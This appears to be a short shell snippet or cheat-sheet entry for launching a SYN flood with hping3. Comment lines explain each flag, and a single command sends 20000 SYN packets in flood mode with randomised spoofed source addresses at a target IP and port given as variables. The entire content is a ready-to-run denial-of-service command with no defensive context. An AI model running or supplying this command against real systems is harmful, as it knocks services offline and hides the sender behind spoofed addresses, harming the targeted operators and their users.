# SYN flood
#   –flood: sent packets as fast as possible
#   –rand-source: random source address
#   -c –count: packet count
#   -d –data: data size
#   -S –syn: set SYN flag
#   -w –win: winsize (default 64)
#   -p –destport: destination port (default 0)

hping3 -c 20000 -d 120 -S -w 64 -p ${TARGET_PORT} --flood --rand-source ${TARGET_IP}
